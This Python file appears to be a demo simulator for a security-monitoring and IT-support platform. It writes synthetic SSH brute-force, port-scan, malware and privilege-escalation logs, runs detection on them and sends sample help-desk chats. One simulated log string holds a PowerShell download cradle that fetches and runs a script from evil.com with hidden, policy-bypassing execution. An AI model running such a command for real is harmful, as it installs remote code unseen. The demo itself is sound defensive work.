"""
SecureFlow AI - Demo Simulator
Generates realistic security events and IT support scenarios for demonstration.
Runs the complete pipeline: Log → Detect → Triage → Investigate → Remediate → Report → Ticket.
"""

import random
from datetime import datetime, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session
from app.models.event import Event
from app.models.alert import Alert
from app.detection.rule_engine import run_all_rules
from app.detection.behavioral import run_behavioral_detection
from app.detection.correlator import correlate_alerts
from app.agents.orchestrator import Orchestrator


# Realistic sample data pools
ATTACKER_IPS = [
    "185.220.101.34", "45.33.32.156", "192.168.1.100",
    "103.224.182.250", "91.121.87.18", "198.51.100.23",
    "203.0.113.42", "172.16.254.1",
]
TARGET_IPS = ["10.0.1.10", "10.0.1.20", "10.0.1.30", "10.0.2.10", "10.0.2.20"]
USERNAMES = ["admin", "root", "jsmith", "agarcia", "kwilson", "mchen", "djones", "lbrown"]
HOSTNAMES = ["web-server-01", "db-server-01", "app-server-01", "workstation-42", "dc-01"]


def generate_ssh_brute_force(db: Session) -> Dict[str, Any]:
    """Generate SSH brute force attack scenario."""
    attacker_ip = random.choice(ATTACKER_IPS[:4])
    target_ip = random.choice(TARGET_IPS)
    now = datetime.utcnow()
    events = []

    # Generate 15 failed SSH login attempts over 2 minutes
    for i in range(15):
        ts = now - timedelta(seconds=random.randint(0, 120))
        username = random.choice(USERNAMES[:4])
        raw_log = (
            f"{ts.strftime('%b %d %H:%M:%S')} {target_ip} sshd[{random.randint(1000,9999)}]: "
            f"Failed password for {username} from {attacker_ip} port {random.randint(40000,65000)} ssh2"
        )
        event = Event(
            source_type="linux",
            source_name="sshd",
            raw_log=raw_log,
            normalized_data={"dest_port": 22, "auth_method": "password"},
            severity="medium",
            confidence=0.9,
            mitre_technique="T1110.001",
            mitre_tactic="Credential Access",
            source_ip=attacker_ip,
            dest_ip=target_ip,
            username=username,
            action="login_failed",
            timestamp=ts,
        )
        db.add(event)
        events.append({
            "source_type": "linux", "source_name": "sshd", "raw_log": raw_log,
            "source_ip": attacker_ip, "dest_ip": target_ip, "username": username,
            "action": "login_failed", "timestamp": ts, "severity": "medium",
            "confidence": 0.9, "normalized_data": {"dest_port": 22},
        })

    db.commit()

    # Run detection
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    # Run full AI analysis on first alert
    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        alert_dict = _alert_to_dict(created_alerts[0])
        analysis_result = orchestrator.analyze_alert(alert_dict, db)

    return {
        "scenario": "SSH Brute Force Attack",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": (
            f"Simulated SSH brute force attack from {attacker_ip} targeting {target_ip}. "
            f"Generated {len(events)} failed login events, detected by rule engine, "
            f"and processed through the full AI analysis pipeline."
        ),
    }


def generate_port_scan(db: Session) -> Dict[str, Any]:
    """Generate port scan scenario."""
    attacker_ip = random.choice(ATTACKER_IPS)
    target_ip = random.choice(TARGET_IPS)
    now = datetime.utcnow()
    events = []
    ports = random.sample(range(1, 10000), 25)

    for port in ports:
        ts = now - timedelta(seconds=random.randint(0, 30))
        raw_log = (
            f"{ts.strftime('%Y-%m-%dT%H:%M:%S')} suricata[alert]: "
            f"ET SCAN Potential Port Scan from {attacker_ip} to {target_ip}:{port}"
        )
        event = Event(
            source_type="network", source_name="suricata", raw_log=raw_log,
            normalized_data={"dest_port": port, "protocol": "tcp"},
            severity="medium", confidence=0.85,
            mitre_technique="T1046", mitre_tactic="Discovery",
            source_ip=attacker_ip, dest_ip=target_ip,
            action="port_scan", timestamp=ts,
        )
        db.add(event)
        events.append({
            "source_type": "network", "source_name": "suricata", "raw_log": raw_log,
            "source_ip": attacker_ip, "dest_ip": target_ip, "action": "port_scan",
            "timestamp": ts, "normalized_data": {"dest_port": port},
        })

    db.commit()
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        analysis_result = orchestrator.analyze_alert(_alert_to_dict(created_alerts[0]), db)

    return {
        "scenario": "Port Scan",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": f"Simulated port scan from {attacker_ip} scanning {len(ports)} ports on {target_ip}.",
    }


def generate_malware_activity(db: Session) -> Dict[str, Any]:
    """Generate malware activity scenario."""
    target_ip = random.choice(TARGET_IPS)
    hostname = random.choice(HOSTNAMES)
    username = random.choice(USERNAMES)
    now = datetime.utcnow()
    events = []

    # Suspicious download
    raw1 = (
        f"{now.strftime('%Y-%m-%d %H:%M:%S')} {hostname} powershell.exe: "
        f"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') "
        f"-ExecutionPolicy Bypass -WindowStyle Hidden"
    )
    event1 = Event(
        source_type="windows", source_name="powershell",
        raw_log=raw1, severity="critical", confidence=0.92,
        mitre_technique="T1059.001", mitre_tactic="Execution",
        source_ip=target_ip, dest_ip=target_ip, username=username,
        action="suspicious_process", timestamp=now,
        normalized_data={"process": "powershell.exe", "parent_process": "cmd.exe"},
    )
    db.add(event1)
    events.append({
        "source_type": "windows", "source_name": "powershell", "raw_log": raw1,
        "source_ip": target_ip, "dest_ip": target_ip, "username": username,
        "action": "suspicious_process", "timestamp": now, "severity": "critical",
    })

    # C2 communication
    raw2 = (
        f"{now.strftime('%Y-%m-%d %H:%M:%S')} {hostname} suricata[alert]: "
        f"ET MALWARE Possible C2 Beacon from {target_ip} to 198.51.100.99:443"
    )
    event2 = Event(
        source_type="network", source_name="suricata",
        raw_log=raw2, severity="critical", confidence=0.88,
        mitre_technique="T1071", mitre_tactic="Command and Control",
        source_ip=target_ip, dest_ip="198.51.100.99",
        action="c2_communication", timestamp=now + timedelta(seconds=30),
    )
    db.add(event2)
    events.append({
        "source_type": "network", "source_name": "suricata", "raw_log": raw2,
        "source_ip": target_ip, "dest_ip": "198.51.100.99",
        "action": "c2_communication", "timestamp": now + timedelta(seconds=30),
    })

    db.commit()
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        analysis_result = orchestrator.analyze_alert(_alert_to_dict(created_alerts[0]), db)

    return {
        "scenario": "Malware Activity",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": f"Simulated malware execution with PowerShell download cradle and C2 communication on {hostname}.",
    }


def generate_privilege_escalation(db: Session) -> Dict[str, Any]:
    """Generate privilege escalation scenario."""
    target_ip = random.choice(TARGET_IPS)
    username = random.choice(USERNAMES[2:])  # Non-root users
    now = datetime.utcnow()
    events = []

    # Sudo to root
    raw = (
        f"{now.strftime('%b %d %H:%M:%S')} {target_ip} sudo: "
        f"{username} : TTY=pts/0 ; PWD=/home/{username} ; "
        f"USER=root ; COMMAND=/bin/bash"
    )
    event = Event(
        source_type="linux", source_name="auth.log",
        raw_log=raw, severity="critical", confidence=0.87,
        mitre_technique="T1548", mitre_tactic="Privilege Escalation",
        source_ip=target_ip, dest_ip=target_ip, username=username,
        action="privilege_escalation", timestamp=now,
        normalized_data={"method": "sudo", "target_user": "root"},
    )
    db.add(event)
    events.append({
        "source_type": "linux", "source_name": "auth.log", "raw_log": raw,
        "source_ip": target_ip, "dest_ip": target_ip, "username": username,
        "action": "privilege_escalation", "timestamp": now,
        "normalized_data": {"method": "sudo", "target_user": "root"},
    })

    db.commit()
    alerts_data = run_all_rules(events, db)
    created_alerts = _store_alerts(db, alerts_data)

    analysis_result = None
    if created_alerts:
        orchestrator = Orchestrator()
        analysis_result = orchestrator.analyze_alert(_alert_to_dict(created_alerts[0]), db)

    return {
        "scenario": "Privilege Escalation",
        "events_generated": len(events),
        "alerts_created": len(created_alerts),
        "analysis": analysis_result,
        "description": f"Simulated privilege escalation: {username} escalated to root via sudo on {target_ip}.",
    }


def generate_vpn_failure(db: Session) -> Dict[str, Any]:
    """Generate VPN failure IT support scenario."""
    orchestrator = Orchestrator()
    result = orchestrator.handle_chat_message(
        "My VPN is not connecting. I keep getting a timeout error when I try to connect to the corporate VPN. "
        "I've been trying for 30 minutes and I can't access any internal resources.",
        session_type="it_support", db=db,
    )
    return {
        "scenario": "VPN Failure",
        "events_generated": 0,
        "alerts_created": 0,
        "analysis": result,
        "description": "Simulated VPN connection failure with IT support troubleshooting.",
    }


def generate_email_outage(db: Session) -> Dict[str, Any]:
    """Generate email outage IT support scenario."""
    orchestrator = Orchestrator()
    result = orchestrator.handle_chat_message(
        "I can't send or receive emails since this morning. Outlook keeps showing 'disconnected' "
        "and webmail is also very slow. Several people in my team have the same issue.",
        session_type="it_support", db=db,
    )
    return {
        "scenario": "Email Outage",
        "events_generated": 0,
        "alerts_created": 0,
        "analysis": result,
        "description": "Simulated email outage with IT support diagnosis.",
    }


def generate_printer_issue(db: Session) -> Dict[str, Any]:
    """Generate printer issue IT support scenario."""
    orchestrator = Orchestrator()
    result = orchestrator.handle_chat_message(
        "The network printer on the 3rd floor is showing offline. I've tried printing from multiple "
        "computers and none of them can reach the printer. The printer display shows it's ready.",
        session_type="it_support", db=db,
    )
    return {
        "scenario": "Printer Issue",
        "events_generated": 0,
        "alerts_created": 0,
        "analysis": result,
        "description": "Simulated network printer offline issue with troubleshooting.",
    }


# Scenario registry
SCENARIOS = {
    "ssh_brute_force": {
        "name": "SSH Brute Force Attack",
        "description": "Simulates 15 failed SSH login attempts from an external IP, triggering detection and full AI analysis pipeline.",
        "type": "security",
        "generator": generate_ssh_brute_force,
    },
    "port_scan": {
        "name": "Port Scan",
        "description": "Simulates network reconnaissance with 25 ports scanned from a single source IP.",
        "type": "security",
        "generator": generate_port_scan,
    },
    "malware_activity": {
        "name": "Malware Activity",
        "description": "Simulates PowerShell download cradle execution and C2 beacon communication.",
        "type": "security",
        "generator": generate_malware_activity,
    },
    "privilege_escalation": {
        "name": "Privilege Escalation",
        "description": "Simulates a user escalating to root privileges via sudo on a Linux server.",
        "type": "security",
        "generator": generate_privilege_escalation,
    },
    "vpn_failure": {
        "name": "VPN Connection Failure",
        "description": "Simulates an employee unable to connect to corporate VPN, triggering IT support workflow.",
        "type": "it_support",
        "generator": generate_vpn_failure,
    },
    "email_outage": {
        "name": "Email Outage",
        "description": "Simulates email service disruption affecting multiple users.",
        "type": "it_support",
        "generator": generate_email_outage,
    },
    "printer_issue": {
        "name": "Printer Offline",
        "description": "Simulates a network printer going offline, requiring IT troubleshooting.",
        "type": "it_support",
        "generator": generate_printer_issue,
    },
}


def run_scenario(scenario_id: str, db: Session) -> Dict[str, Any]:
    """Run a specific demo scenario."""
    scenario = SCENARIOS.get(scenario_id)
    if not scenario:
        return {"error": f"Unknown scenario: {scenario_id}"}
    return scenario["generator"](db)


def run_all_scenarios(db: Session) -> List[Dict[str, Any]]:
    """Run all demo scenarios."""
    results = []
    for scenario_id in SCENARIOS:
        result = run_scenario(scenario_id, db)
        results.append(result)
    return results


def _store_alerts(db: Session, alerts_data: List[Dict]) -> List[Alert]:
    """Store generated alerts in the database."""
    created = []
    for data in alerts_data:
        alert = Alert(
            alert_type=data["alert_type"],
            severity=data["severity"],
            confidence=data["confidence"],
            title=data["title"],
            description=data.get("description"),
            affected_assets=data.get("affected_assets"),
            evidence=data.get("evidence"),
            mitre_id=data.get("mitre_id"),
            mitre_tactic=data.get("mitre_tactic"),
            mitre_technique_name=data.get("mitre_technique_name"),
            source_ip=data.get("source_ip"),
            dest_ip=data.get("dest_ip"),
            status="open",
            priority="P3",
        )
        db.add(alert)
        created.append(alert)
    db.commit()
    for a in created:
        db.refresh(a)
    return created


def _alert_to_dict(alert: Alert) -> Dict:
    """Convert Alert ORM object to dictionary."""
    return {
        "id": alert.id,
        "alert_type": alert.alert_type,
        "severity": alert.severity,
        "confidence": alert.confidence,
        "title": alert.title,
        "description": alert.description,
        "affected_assets": alert.affected_assets,
        "evidence": alert.evidence or {},
        "mitre_id": alert.mitre_id,
        "mitre_tactic": alert.mitre_tactic,
        "mitre_technique_name": alert.mitre_technique_name,
        "source_ip": alert.source_ip,
        "dest_ip": alert.dest_ip,
    }
